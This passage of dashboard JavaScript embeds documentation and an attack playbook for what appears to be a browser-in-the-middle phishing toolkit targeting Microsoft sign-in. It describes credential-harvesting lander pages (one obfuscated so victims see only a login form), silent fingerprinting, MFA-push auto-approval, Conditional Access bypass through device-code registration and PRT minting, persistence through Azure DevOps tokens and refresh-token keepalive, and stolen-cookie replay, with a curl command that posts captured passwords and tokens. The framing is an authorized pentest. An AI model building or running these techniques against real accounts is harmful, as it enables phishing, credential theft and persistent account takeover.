    <li><b>Register from this session</b> (button in the <code>:8091</code> nav bar) — when you're already authenticated inside the canvas. Reads UA + JS signals via <code>page.evaluate</code> + <code>navigator.userAgentData.getHighEntropyValues</code>; reads cookies and per-origin localStorage from <code>page.context.storage_state()</code>; reads sessionStorage from the active page. Optional "include cookies + storage" toggle.</li>
    <li><b>Add device…</b> (Devices tab toolbar) — pick a preset (<code>iphone-15-safari</code> / <code>pixel-8-chrome</code> / <code>win11-edge</code> / <code>macos-safari</code> / <code>win10-chrome</code>) or paste any UA in the Advanced form. Engine/channel/impersonate are re-derived from the final UA so manual and captured paths converge.</li>
  </ol>

  <h3>Launch with a device</h3>
  <p>Each profile row has a <b>Launch</b> button. Behind the scenes the dashboard opens <code>http://&lt;host&gt;:8091/?auto=1&amp;device_id=&lt;id&gt;&amp;url=&lt;start&gt;</code>; the React frontend forwards <code>device_id</code> and <code>start_url</code> on to the WS at <code>/api/browser/session</code>. <code>browser_session()</code>:</p>
  <ul>
    <li>Prefers the device's <code>engine_family</code> + <code>channel</code> over the per-host fingerprint replay logic.</li>
    <li>Calls <code>devices.apply_to_context_opts(profile, context_opts)</code> immediately before <code>browser.new_context(**context_opts)</code> — sets <code>user_agent</code>, <code>locale</code>, <code>timezone_id</code>, <code>viewport</code>, <code>device_scale_factor</code>, <code>is_mobile</code>, <code>has_touch</code>, and merges Sec-CH-UA-* into <code>extra_http_headers</code>.</li>
    <li>Calls <code>devices.apply_post_launch(profile, page)</code> after the page is created and <i>before</i> the first navigation — <code>add_cookies()</code>, <code>set_extra_http_headers()</code>, and <code>add_init_script()</code> seed local/sessionStorage.</li>
    <li>Bumps <code>last_used_at</code> on the profile.</li>
  </ul>

  <h3>Logging</h3>
  <p>Every device event lands on a dedicated <code>devices</code> log category with <code>DEVICE_*</code> verbs:</p>
  <pre>DEVICE_REGISTER_MANUAL / DEVICE_REGISTER_FROM_CAPTURE / DEVICE_REGISTER_FROM_SESSION
DEVICE_PROBE_PENDING / DEVICE_PROBE_PAGE_SERVED / DEVICE_PROBE_APPLIED / DEVICE_PROBE_REJECT
DEVICE_APPLY_CONTEXT / DEVICE_APPLY_POST_LAUNCH / DEVICE_LAUNCH_REQUEST
DEVICE_UPDATE / DEVICE_DELETE</pre>
  <p>Filter All Logs to Service <code>devices</code> in the dropdown, or grep <code>journalctl -u bitm-proxy -g "DEVICE_"</code>. Apply-context and apply-post-launch entries also bind <code>session_id</code> so per-session log files surface them.</p>

  <h3>WS commands &amp; REST</h3>
  <p>WS (over <code>/ws/control</code>): <code>list_devices</code>, <code>get_device</code>, <code>register_device_from_capture</code>, <code>register_device_from_session</code>, <code>register_device_manual</code>, <code>update_device</code>, <code>delete_device</code>, <code>launch_with_device</code>.</p>
  <p>REST (mounted at <code>/api/devices</code>): <code>GET</code> list / <code>GET /presets</code> / <code>GET/PATCH/DELETE /{id}</code> / <code>POST</code> manual-or-preset / <code>POST /from-capture</code> / <code>POST /from-session</code> / <code>POST /probe-callback</code>.</p>

  <h2>Sending flows to Burp (RAG Scan Bridge)</h2>
  <p>This container implements the RAG Scan Stack API on port <code>8000</code>. Point the Burp extension there and it will pull captured login flows as informational findings named <code>trace_flow_for_&lt;hostname&gt;</code>.</p>
  <ol>
    <li>In Burp: Extensions → Add → Python → select <code>burp-extension/RagScanBridge.py</code>.</li>
    <li>Open the <b>RAG Scan Bridge</b> tab in Burp.</li>
    <li>Set <b>RAG API URL</b> to <code>http://${host}:8000</code> (default <code>https://localhost:8000</code> won't work — no TLS here).</li>
    <li>Set <b>API Key</b> to anything non-empty (no auth enforced on the RAG API).</li>
    <li>Click <b>Test Connection</b>. You should see "Connected — bitm-proxy".</li>
    <li>Click <b>Import Filtered Findings</b> (or <b>Import All</b>) to pull flows as Burp scan issues.</li>
  </ol>
  <p>You can also push to an <i>external</i> RAG Scan Stack from the Flow Trace tab: click <b>Send to RAG</b>. That uses <code>rag_api_url</code> from the Configuration panel.</p>

  <h2>Ollama flow analysis</h2>
  <p>Configured in the <b>Configuration</b> panel (left sidebar, top of dashboard). Three keys:</p>
  <table>
    <tr><th>Key</th><th>Default</th><th>Notes</th></tr>
    <tr><td><code>ollama_enabled</code></td><td>off</td><td>Master toggle. Flip on to enable the <b>Analyze (Ollama)</b> button.</td></tr>
    <tr><td><code>ollama_url</code></td><td><code>http://localhost:11434</code></td><td>URL of a running Ollama server. From inside this container, use <code>http://host.docker.internal:11434</code> if Ollama runs on the Mac host.</td></tr>
    <tr><td><code>ollama_model</code></td><td><code>llama3.1:8b</code></td><td>Any model you have pulled — e.g. <code>qwen2.5:14b</code>, <code>llama3.1:70b</code>.</td></tr>
  </table>
  <div class="hint">On the Mac, run <code>ollama serve</code> then <code>ollama pull llama3.1:8b</code>. Set <code>ollama_url</code> to <code>http://host.docker.internal:11434</code> from inside the container. Clicking <b>Analyze (Ollama)</b> on the Flow Trace tab sends a compact summary to <code>/api/chat</code> and shows the model's markdown reply inline.</div>

  <h2>SSH port forwarding (remote stack, local tools)</h2>
  <p>When this stack runs on a remote box but you keep Ollama and Burp on your laptop, use an SSH session with both <code>-L</code> (remote → laptop) and <code>-R</code> (laptop → remote) forwards:</p>
  <pre>ssh -q -i &lt;PATH_TO_KEY&gt; \\
    -o ExitOnForwardFailure=yes \\
    -o ServerAliveInterval=60 \\
    -L 3128:localhost:3128 \\
    -L 3129:localhost:3129 \\
    -L 8091:localhost:8091 \\
    -L 8092:localhost:8092 \\
    -R 11434:localhost:11434 \\
    -R 8080:localhost:8080 \\
    &lt;USER&gt;@&lt;REMOTE_HOST&gt;</pre>
  <p>Meaning of each flag:</p>
  <table>
    <tr><th>Flag</th><th>Direction</th><th>Purpose</th></tr>
    <tr><td><code>-L 3128:localhost:3128</code></td><td>remote → laptop</td><td>Python BITM auth proxy reachable at <code>localhost:3128</code> on your laptop</td></tr>
    <tr><td><code>-L 3129:localhost:3129</code></td><td>remote → laptop</td><td>Go test proxy</td></tr>
    <tr><td><code>-L 8091:localhost:8091</code></td><td>remote → laptop</td><td>Remote-browser UI</td></tr>
    <tr><td><code>-L 8092:localhost:8092</code></td><td>remote → laptop</td><td>This debug dashboard</td></tr>
    <tr><td><code>-R 11434:localhost:11434</code></td><td>laptop → remote</td><td>Remote can reach your laptop's Ollama at <code>127.0.0.1:11434</code> — set <code>ollama_url</code> accordingly</td></tr>
    <tr><td><code>-R 8080:localhost:8080</code></td><td>laptop → remote</td><td>Remote can reach your laptop's Burp proxy at <code>127.0.0.1:8080</code> — set <code>upstream_proxy_host</code> to <code>127.0.0.1:8080</code></td></tr>
    <tr><td><code>-o ExitOnForwardFailure=yes</code></td><td>—</td><td>Abort loudly if any port is already bound (avoids silent missing tunnels)</td></tr>
    <tr><td><code>-o ServerAliveInterval=60</code></td><td>—</td><td>60 s keepalive so idle tunnels don't drop through corporate NAT</td></tr>
  </table>
  <p>The <code>-R</code> forwards bind the remote's loopback only by default — nothing outside the remote box can reach your laptop's Ollama or Burp.</p>
  <div class="hint">Detached variant (tunnels only, no shell): add <code>-qNf</code> (no TTY, no remote command, fork after auth). Kill with <code>pkill -f 'ssh.*&lt;REMOTE_HOST&gt;'</code>.</div>
  <p>Verify the reverse tunnels after connect, from the remote:</p>
  <pre>ss -tlnp | grep -E ':(11434|8080)\\b'
curl -s http://127.0.0.1:11434/api/tags | head -c 200
curl -sI http://127.0.0.1:8080/</pre>

  <h2>RAG Scan Stack integration (config)</h2>
  <p>Set via the <b>Configuration</b> panel:</p>
  <table>
    <tr><th>Key</th><th>Notes</th></tr>
    <tr><td><code>rag_enabled</code></td><td>Must be on for <b>Send to RAG</b> button to work.</td></tr>
    <tr><td><code>rag_api_url</code></td><td>External RAG Scan Stack URL. Leave blank to only use our built-in API on :8000.</td></tr>
    <tr><td><code>rag_api_key</code></td><td>API key for the external RAG.</td></tr>
    <tr><td><code>rag_engagement_id</code></td><td>Optional engagement UUID to attach findings to.</td></tr>
  </table>

  <h2>Reverse Proxy (transparent BITM)</h2>
  <p><b>Authorized pentest / red-team use only.</b> Port <code>8085</code> runs a multi-tenant reverse proxy that transparently forwards to arbitrary target sites. Every req/resp is captured to the Flow Trace tab under a synthetic session <code>revproxy_&lt;hostname&gt;</code>.</p>
  <ol>
    <li>Open <a href="http://${host}:8085/" target="_blank" style="color:#7dd3fc">http://${host}:8085/</a>.</li>
    <li>Enter the target URL (e.g. <code>https://login.microsoftonline.com</code>) and click <b>Proxy</b>.</li>
    <li>Browse and log in through the proxy as you normally would. Multiple targets at once are supported via different <code>/_r/&lt;host&gt;/...</code> URLs.</li>
    <li>On the debug dashboard, switch to <b>Flow Trace</b>, pick the <code>revproxy_&lt;host&gt;</code> session from the dropdown, and use markers / taint / Send to RAG / Analyze (Ollama) on the full captured flow.</li>
  </ol>
  <div class="hint">Limitations (v1): no WebSocket upgrade forwarding; JS URL rewriting covers <code>fetch</code> + <code>XMLHttpRequest</code> only; sites with strong anti-framing or origin checks may detect the proxy.</div>

  <h2>Auth Proxy</h2>
  <p>Start from the <b>Proxy</b> tab. Default port <code>3128</code>. Configure your tool (or browser) to use it:</p>
  <pre>curl -k -x http://${host}:3128 https://example.com</pre>
  <p>For HTTPS injection to work, trust the generated CA cert from <code>/data/proxy_ca/ca.crt</code>:</p>
  <pre>docker exec bitm-proxy cat /data/proxy_ca/ca.crt</pre>

  <h2>External credential ingest — POST /api/capture/external</h2>
  <p><b>Authorized pentest use only.</b> Pentester-side tooling (Burp extension, a separate runner, anything that obtains credentials outside the <code>:3128</code> BITM path) can push them into the same credentials store + Slack capture channel as in-band auto-captures.</p>
  <p><b>→ For complete setup guide, file locations, lander deployment, log formats, and troubleshooting, see <code>docs/EXTERNAL_CAPTURE_SETUP.md</code> in the repo.</b></p>
  <p>Quick setup (in <b>Settings &rarr; Configuration &rarr; External capture</b>):</p>
  <ul>
    <li><code>external_capture_token</code> — bearer token required on every request. Empty disables the endpoint (returns 404). Also accepts <code>EXTERNAL_CAPTURE_TOKEN</code> env or <code>config/external_capture_token.txt</code>.</li>
    <li><code>external_capture_allowed_ips</code> — comma-separated IPs/CIDRs. Loopback is always allowed; remote callers must be on this list. Empty = loopback-only.</li>
  </ul>
  <p>POST a JSON bundle (<code>site_id</code> required, everything else optional):</p>
  <pre>curl -s -X POST http://${host}:8092/api/capture/external \\
    -H "Authorization: Bearer $EXTERNAL_CAPTURE_TOKEN" \\
    -H "Content-Type: application/json" \\
    -d '{"site_id":"microsoft","user":"alice@example.com",
         "source_url":"https://login.microsoftonline.com/...",
         "username":"alice@example.com","password":"...",
         "tokens":[{"name":"access_token","value":"eyJ..."}],
         "cookies":[{"name":"ESTSAUTH","value":"...",
                     "domain":".login.microsoftonline.com"}],
         "notes":"captured by burp ext"}'</pre>
  <p>Accepted body fields: <code>site_id</code>, <code>user</code>, <code>source_url</code>, <code>username</code>, <code>password</code>, <code>tokens</code> (list of str or <code>{name,value,...}</code>), <code>cookies</code> (list of cookie dicts; replaces existing — mirrors the in-band manual-capture merge), <code>local_storage</code>, <code>session_storage</code>, <code>captured_inputs</code>, <code>notes</code>.</p>
  <p><code>X-Capture-Token</code> is accepted as an alternative header. Token comparison is constant-time. Writes go through the same <code>JsonStore("credentials")</code> namespace, so <code>CREDENTIAL_PASSPHRASE</code> encryption-at-rest applies automatically.</p>
  <h3>Lander pages — <code>pages/lander.html</code> and <code>pages/login.html</code></h3>
  <p>Two variants ship in the repo. Both gather form inputs + device fingerprint (UA, Sec-CH-UA-* client hints via <code>userAgentData.getHighEntropyValues</code>, screen, viewport, timezone, languages, hardware concurrency, WebGL renderer/vendor) + same-origin cookies + <code>localStorage</code> / <code>sessionStorage</code>, POST to <code>/api/capture/external</code> with <code>keepalive: true</code>, then redirect to a configured real login URL so the flow looks unbroken. Same wire shape; different audiences.</p>
  <ul>
    <li><b><code>pages/lander.html</code></b> &mdash; <b>engineering-documented</b>. The top-of-file comments spell out the deployment hazards (token visibility, CORS requirements, IP-allowlist semantics). Use this to learn the shape and understand the moving pieces.</li>
    <li><b><code>pages/login.html</code></b> &mdash; <b>deployment-ready</b>. Same JSON body and POST flow, but the visible page source uses short neutral identifiers (<code>S.k</code>, <code>S.e</code>, <code>ctx()</code>, <code>rs()</code>, <code>rc()</code>) so a target viewing source sees only a login form that records session analytics. Edit the four-field <code>S</code> block at the top: <code>g</code> = site_id, <code>k</code> = token, <code>e</code> = endpoint, <code>n</code> = next URL.</li>
  </ul>
  <ol>
    <li>Pick the variant you want to deploy and edit the config block at the top.</li>
    <li><b>Same-origin hosting</b> (no CORS setup): copy into <code>static/</code> and open <code>http://${host}:8091/login.html</code> (or <code>lander.html</code>).</li>
    <li><b>Cross-origin hosting</b> (separate believable domain): add the page's origin to <code>external_capture_cors_origins</code> (or set it to <code>*</code>), AND broaden <code>external_capture_allowed_ips</code> to include the source IP range that will POST (often <code>0.0.0.0/0</code>, since those IPs aren't predictable). Bearer token + Origin check are the real auth in this mode.</li>
    <li>Restyle the form to match the engagement pretext &mdash; the capture logic is style-agnostic.</li>
  </ol>
  <div class="hint">The bearer token is embedded in page source for either variant. Use a single-purpose token and rotate it after the engagement. Per-field reference + UI mapping: <code>docs/SESSIONS.md</code> &rarr; <b>External Capture</b>. Implementation: <code>backend/routes/capture.py</code>.</div>

  <h2>Environment / run</h2>
  <pre>./run.sh</pre>
  <p>Env vars:</p>
  <ul>
    <li><code>REQUIRE_API_KEY=false</code> — disable the auth middleware on :8091 and :8092 (set by run.sh).</li>
    <li><code>HOST=0.0.0.0</code> — bind address (set in Dockerfile).</li>
    <li><code>PORT</code>, <code>DEBUG_PORT</code>, <code>RAG_PORT</code> — override ports.</li>
    <li><code>CREDENTIAL_PASSPHRASE</code> — encrypt captured credentials at rest (AES-256-GCM).</li>
  </ul>

  </div>

  <div id="docs-pane-attacks" style="display:none">

  <p style="color:#94a3b8">Step-by-step playbook for every attack/demo this tool can drive. Run these only against a tenant you're authorized to test — the lab deployment scopes the BITM proxy and Phantom Join to an allowlisted tenant via <code>proxy_allowed_hosts</code> / <code>phantom_join_allowed_domains</code> (see <code>docs/PROXY_DEEP_DIVE.md</code>, <code>tools/README_Phantom.md</code>); a self-hosted instance has no such restriction unless you configure one.</p>

  <div class="attack-card">
    <h3><a href="http://${host}:8091/" target="_blank" rel="noopener noreferrer">1. Push notification auto-click (Path A)</a><span class="portal-arrow">↗ session UI (:8091)</span></h3>
    <p class="attack-goal">Goal: show that a CA policy allowing Microsoft Authenticator push, alongside a stronger method like a passkey, is only as strong as the weakest option — the tool auto-approves the push before the user even sees the picker.</p>
    <ol>
      <li>Open the main session UI (<code>:8091</code>, or <code>/tp8091/</code>/<code>/start</code> on the lab).</li>
      <li>Start a session against the target login URL and sign in with the test account's username/password.</li>
      <li>When the MFA method picker appears, watch the <b>All Logs</b> tab (<code>:8092</code>) — it auto-selects push notification if offered and clicks through, rather than waiting on a passkey/FIDO2 prompt.</li>
      <li>Approve the push on the registered phone.</li>
      <li>Confirm the session completes login — check <b>Flow Trace</b> for a <span class="flow-ms-badge tokens" style="padding:1px 6px">TOKENS</span> pill after the push exchange.</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="http://${host}:8091/" target="_blank" rel="noopener noreferrer">2. Passkey dead-end detection</a><span class="portal-arrow">↗ session UI (:8091)</span></h3>
    <p class="attack-goal">Goal: confirm the tool correctly recognizes when passkey/FIDO2 is the <i>only</i> method offered and stops rather than guessing — this is the negative case that proves push auto-click isn't just clicking blindly.</p>
    <ol>
      <li>Use (or configure) a test account whose CA policy/method registration only allows a passkey — no push, no SMS.</li>
      <li>Start a session the same way as attack #1.</li>
      <li>Watch <b>All Logs</b> for a dead-end message once the picker resolves to passkey-only.</li>
      <li>Confirm no auto-click happens and no token is captured in <b>Flow Trace</b> — this is the expected, correct outcome, not a bug.</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="http://${host}:8091/silent.html" target="_blank" rel="noopener noreferrer">3. Silent drive-by fingerprinting</a><span class="portal-arrow">↗ /silent page · results in Captured Data</span></h3>
    <p class="attack-goal">Goal: capture a visitor's browser + device fingerprint with zero interaction and zero visible page content, then <b>tie it to their follow-on login</b> — the session replays the exact device you silently fingerprinted.</p>
    <ol>
      <li>Send the target to <code>/silent</code> (redirects to <code>silent.html</code>) — same-origin hosting under <code>:8091</code>, or the lab's public <code>/silent</code> alias.</li>
      <li>The page renders nothing visible; it POSTs the fingerprint to <code>/api/capture/external</code> automatically on load, mints a correlation id (<code>cid</code>), and funnels the visitor onward to <code>/start?cid=…</code> (the hosted login session).</li>
      <li>The session started that way builds a <b>device profile from the silent capture</b> and replays it (see the <code>CID_LINK</code> line in <b>All Logs</b>): the IdP sees the visitor's real UA / client hints / timezone, not the server's.</li>
      <li>Confirm the tie: <b>Captured Data</b> shows the silent-fp entry with a <code>linked_device_id</code>, and the <b>Devices</b> tab (<code>:8092</code>) shows a "Silent capture …" profile tagged with the same <code>cid</code>. Any creds the session captures carry the same <code>cid</code>.</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="#" onclick="return docsGoTab('phantom')">4. Phantom Join — device-code CA bypass (Path B)</a><span class="portal-arrow">→ Phantom tab</span></h3>
    <p class="attack-goal">Goal: demonstrate that a CA policy scoped to interactive/browser sign-in can be sidestepped entirely via the device-code grant (RFC 8628) plus a phantom device registration — no passkey or push involved at all.</p>
    <ol>
      <li>Open the <b>Phantom</b> tab (<code>:8092</code>).</li>
      <li>Fill in <b>Username (UPN)</b>, <b>Password</b>, and <b>Domain</b> for the authorized test tenant.</li>
      <li>Leave <b>Dry run</b> checked first to preview every <code>roadtx</code>/<code>roadrecon</code> command without executing anything — review the log.</li>
      <li>Uncheck <b>Dry run</b>, leave <b>Start phase</b> at 1 with no <b>Stop phase</b> cap, and click <b>▶ Run</b>.</li>
      <li>Watch <code>phantom-phase</code> and the live log step through: DRS token (phase 1-2) → device registration (phase 3) → PRT mint + exchange (phase 4-5).</li>
      <li>On completion, the findings panel shows the minted token/PRT claims — confirms CA was bypassed for a policy that only gated the interactive endpoint.</li>
      <li><b>Cleanup:</b> delete the registered device from Entra admin center → Devices, and revoke the test account's sessions — the tool's own delete only removes the local cert copy.</li>
    </ol>
    <div class="hint">If <code>phantom_join_allowed_domains</code> is configured (lab deployments), a domain outside that list is rejected immediately with no subprocess spawned — worth demonstrating as the safety boundary, not just the attack.</div>
  </div>

  <div class="attack-card">
    <h3><a href="#" onclick="return docsGoTab('creds')">5. ROPC legacy auth test</a><span class="portal-arrow">→ Captured Data tab</span></h3>
    <p class="attack-goal">Goal: show that the resource-owner-password-credentials grant goes straight to <code>/oauth2/v2.0/token</code>, skipping the interactive authorization endpoint (and whatever CA enforcement only runs there).</p>
    <ol>
      <li>Open <b>Captured Data</b> tab, find the card for a site where credentials were captured.</li>
      <li>Click <b>Test ROPC…</b> on that card.</li>
      <li>The username/password fields auto-fill from the captured input (first email-like value = user, first non-email ≥4 chars = password) — verify or edit them, and set <b>Tenant</b> (use <code>organizations</code>, not <code>common</code>/<code>consumers</code> — those are rejected outright with <code>AADSTS9001023</code> before credentials are even evaluated).</li>
      <li>Click Run — a 200 with an access token means the CA/MFA gap is real for this account; an <code>AADSTS50076</code>/<code>AADSTS53003</code>-class error means ROPC itself was blocked (the control is working as intended).</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="#" onclick="return docsGoTab('creds')">6. Create an Azure DevOps PAT (persistence)</a><span class="portal-arrow">→ Captured Data tab</span></h3>
    <p class="attack-goal">Goal: turn a captured identity into a long-lived Azure DevOps Personal Access Token — durable credential material that survives the victim's password reset and usually sits outside the CA/MFA re-evaluation that gates interactive sign-in.</p>
    <ol>
      <li>Open <b>Captured Data</b> tab, find the card for a site where credentials were captured, and click <b>Create ADO PAT…</b> (directly below Test ROPC) to open the panel.</li>
      <li>Pick the <b>Method</b> that acquires the ADO-audience token:
        <ul>
          <li><b>ROPC</b> (default) — password grant; fails on an MFA/CA-blocked tenant.</li>
          <li><b>Device code</b> — interactive; complete sign-in at <code>microsoft.com/devicelogin</code> (satisfies basic MFA), then the PAT is minted automatically.</li>
          <li><b>Phantom PRT</b> — exchange a <code>roadtx.prt</code> from a completed <b>Phantom Join</b> run (attack #4) for an ADO token via <code>roadtx prtauth</code>; the path that works when device-code/ROPC are CA-blocked, since the PRT carries device claims.</li>
          <li><b>Captured token</b> — paste an existing ADO-audience token (<code>aud = 499b84ac-…</code>).</li>
        </ul>
      </li>
      <li>Set <b>Tenant</b> (<code>organizations</code> or a tenant GUID/domain). The <b>ADO org</b> field pre-fills from <b>Settings → Azure / ADO defaults → default ado org</b> when set; leave it blank to auto-discover, or click <b>☰ List ADO orgs</b> to enumerate the account's orgs (via the vssps accounts API, no PAT minted) and hit <b>Use</b> to drop one in.</li>
      <li>Pick a <b>Scope</b> (<code>app_token</code> = full access, or a space-delimited list like <code>vso.code vso.build</code>), <b>Valid days</b>, and optionally <b>all orgs</b>. Click <b>▶ Create</b>.</li>
      <li>A blocked token grant surfaces the <code>AADSTS</code> code as the finding (control working). A minted PAT is returned with a Copy button — a real, listable token in the target org, tagged with the method it was acquired by.</li>
      <li><b>Cleanup:</b> revoke the PAT from Azure DevOps → User settings → Personal access tokens (the panel shows its <code>authorizationId</code>).</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="#" onclick="return docsGoTab('creds')">7. Graph API recon with a captured token</a><span class="portal-arrow">→ Captured Data tab</span></h3>
    <p class="attack-goal">Goal: with a captured Graph-audience token, map what the identity can reach — read-only enumeration of the tenant via Microsoft Graph. Every call lands in the Azure AD sign-in logs, so this is loud by design.</p>
    <ol>
      <li>Open <b>Captured Data</b> and expand the card for a site with a captured token.</li>
      <li>In the <b>Graph:</b> row, pick a call from the dropdown — <b>Who am I</b> (<code>/me</code>), <b>My groups &amp; roles</b>, <b>Directory users</b>, <b>Groups</b>, <b>Service principals</b>, <b>App registrations</b>, <b>Directory roles</b>, <b>Role assignments</b>, <b>Conditional Access policies</b>, <b>All devices</b>, <b>Intune managed devices</b> — or type a custom Graph URL in the override box.</li>
      <li>Click <b>Run</b>. The response renders inline and is recorded as a <span style="color:#4ade80">🧪 Graph</span> flow trace (selectable in <b>Flow Trace</b> / send-to-LLM).</li>
      <li>A <code>200</code> means the token holds that scope; <code>401</code>/<code>403</code> means it doesn't. Audience matters — a <b>Graph</b> token returns a profile error against ADO/vssps and vice-versa.</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="#" onclick="return docsGoTab('creds')">8. Abuse Graph API permissions (AAA)</a><span class="portal-arrow">→ Captured Data tab</span></h3>
    <p class="attack-goal">Goal: drive Hagrid29's <code>AbuseAzureAPIPermissions.ps1</code> recon/abuse functions through <code>pwsh</code> with a captured Graph token — enumerate, and (if explicitly enabled) abuse, the Graph API permissions the identity holds.</p>
    <ol>
      <li>Open <b>Captured Data</b>, expand a card, and in the <b>AAA:</b> row click <b>Run function…</b>.</li>
      <li>Pick a <b>Function</b> from the dropdown, choose the <b>Token</b> to run it with, and add PowerShell-style <b>Args</b> (e.g. <code>-UserId 'alice@example.com' -Search 'finance'</code>).</li>
      <li>Click <b>Run</b> — output renders inline and is recorded as a <span style="color:#4ade80">🧪 AAA</span> flow trace.</li>
    </ol>
    <div class="hint">Recon-only by default. Destructive functions must be added to <code>aaa_runner.allowed_functions</code> in <code>$DATA_DIR/sites.yaml</code> before they can run. Every call lands in the Azure AD sign-in logs.</div>
  </div>

  <div class="attack-card">
    <h3><a href="#" onclick="return docsGoTab('auth-proxy')">9. Credential injection via the auth proxy (:3128)</a><span class="portal-arrow">→ Proxy Traffic tab</span></h3>
    <p class="attack-goal">Goal: replay a previously captured session's cookies/tokens transparently through the BITM proxy into new outbound requests — turning a one-time capture into ongoing access.</p>
    <ol>
      <li>Open the <b>Proxy</b> tab, click <b>Start Proxy</b>.</li>
      <li>Point a client at the published port (default <code>3128</code>, any of <code>3100-3199</code>) with the proxy's CA cert trusted.</li>
      <li>Browse to a host with an existing capture in <b>Captured Data</b> — watch <b>Proxy Traffic</b> for <code>INJECT</code>/<code>BITM_INJECT</code> entries showing the stored cookies/headers being merged into the live request.</li>
      <li>Confirm the site treats the request as already-authenticated (no login prompt) in the browser driving through the proxy.</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="#" onclick="return docsGoTab('keepalive-log')">10. Token keepalive / persistence</a><span class="portal-arrow">→ Keep-Alive tab</span></h3>
    <p class="attack-goal">Goal: show a captured refresh token being silently exercised on a schedule to stay valid well past normal expiry, without re-triggering CA/MFA.</p>
    <ol>
      <li>Open the <b>Keep-Alive</b> tab and enable keepalive for a captured session (Settings → Keep-Alive subtab has the interval).</li>
      <li>Watch the Keep-Alive log for periodic refresh entries.</li>
      <li>Revisit the site hours later using the same captured session/cookies — it should still be authenticated.</li>
    </ol>
  </div>

  <div class="attack-card">
    <h3><a href="http://${host}:8091/lander.html" target="_blank" rel="noopener noreferrer">11. Lander credential-capture page</a><span class="portal-arrow">↗ /lander page · results in Captured Data</span></h3>
    <p class="attack-goal">Goal: a believable-looking login page that harvests submitted credentials directly via <code>POST /api/capture/external</code>, for pretexting scenarios where driving a real browser session isn't the goal.</p>
    <ol>
      <li>Send the target to <code>/lander</code> (redirects to <code>lander.html</code>) — same-origin under <code>:8091</code>, or the lab's public <code>/lander</code> alias.</li>
      <li>Whatever is submitted posts to <code>/api/capture/external</code> and the page then redirects on to <code>next_url</code> (defaults to the real <code>default_login_url</code>) so the target lands on a real, working sign-in page and doesn't suspect anything.</li>
      <li>Check <b>Captured Data</b> for the new entry with the submitted username/password.</li>
    </ol>
    <div class="hint">Never enter real production credentials on this page during a demo — see <code>docs/EXTERNAL_CAPTURE_SETUP.md</code> for cross-origin hosting and token rotation guidance.</div>
  </div>

  </div>
  `;
  document.getElementById('docs-content').innerHTML=html;
}

function switchDocsPane(name){
  document.querySelectorAll('.docs-subtab-btn').forEach(b=>b.classList.toggle('active', b.dataset.docsPane===name));
  const ref=document.getElementById('docs-pane-reference'), atk=document.getElementById('docs-pane-attacks');
  if(ref) ref.style.display = name==='reference' ? '' : 'none';
  if(atk) atk.style.display = name==='attacks' ? '' : 'none';
}
// "Follow the link over to where it is in the portal" — the Test Attacks
// card titles call this to jump straight to the dashboard tab that hosts
// the attack. Returns false so the anchor's href="#" doesn't scroll.
function docsGoTab(tab){
  try{switchTab(tab)}catch(_){}
  return false;
}

// ── Config ──
const INTEGRATION_KEYS=new Set(['rag_enabled','rag_api_url','rag_api_key','rag_engagement_id','ollama_enabled','ollama_url','ollama_model','ollama_temperature','ollama_top_p','ollama_top_k','ollama_num_ctx','ollama_num_predict','ollama_keep_alive','ollama_think','ollama_seed','ollama_system_prompt','ollama_system_prompt_sso','ollama_system_prompt_saml','ollama_system_prompt_oidc','ollama_system_prompt_troubleshoot']);
const BROWSER_KEYS=['browser_type','browser_chrome','private_mode','mobile_emulation','ignore_ssl','goto_timeout','heartbeat_interval','screenshot_interval','screenshot_quality','screenshot_dpr','max_screenshots'];
const LOGGING_KEYS=['verbose','log_requests','log_responses','log_auth_headers','log_set_cookies','log_console','log_heartbeats','log_to_file','mask_captured_input'];
const SLACK_KEYS=['enable_slack_notifications','slack_keepalive_webhook','slack_capture_webhook','slack_routine_webhook'];
const FINGERPRINT_KEYS=[
  'use_captured_fingerprint',
  'fingerprint_match_engine',
  'fingerprint_match_tls_proxy',
  'device_probe_enabled',
  'allow_drs_replay',
];
const KEEPALIVE_KEYS=[
  'keepalive_enabled',
  'keepalive_interval_minutes',
  'keepalive_max_consecutive_failures',
  'keepalive_trace_enabled',
  'keepalive_playwright_fallback_enabled',
  'keepalive_playwright_timeout_seconds',
  'enable_token_testing',
];
// Performance tab key sets — categorised for render layout.
const PERF_STREAM_KEYS=['screenshot_interval','screenshot_quality','screenshot_dpr','max_screenshots','heartbeat_interval','screenshot_low_fidelity_non_chromium'];
const PERF_DASHBOARD_KEYS=['ws_history_lines','filter_noisy_requests'];
const PERF_POOL_KEYS=['workers_enabled','worker_count','worker_sessions_max'];
const CATEGORIZED_KEYS=new Set([...BROWSER_KEYS,...LOGGING_KEYS,...SLACK_KEYS,...FINGERPRINT_KEYS,...KEEPALIVE_KEYS]);
function _cfgRowHtml(k,v){
  const label=k.replace(/_/g,' ');
  if(k==='browser_type')return `<div class="config-row"><label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="edge"${v==='edge'?' selected':''}>Edge (emulated)</option><option value="edge-real"${v==='edge-real'?' selected':''}>Edge (real)</option><option value="chrome"${v==='chrome'?' selected':''}>Chrome</option><option value="firefox"${v==='firefox'?' selected':''}>Firefox</option></select></div>`;
  if(k==='browser_chrome')return `<div class="config-row"><label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="full"${v==='full'?' selected':''}>Full (address bar + controls)</option><option value="minimal"${v==='minimal'?' selected':''}>Minimal (paste/capture/close only)</option><option value="none"${v==='none'?' selected':''}>None (primary window only)</option></select></div>`;
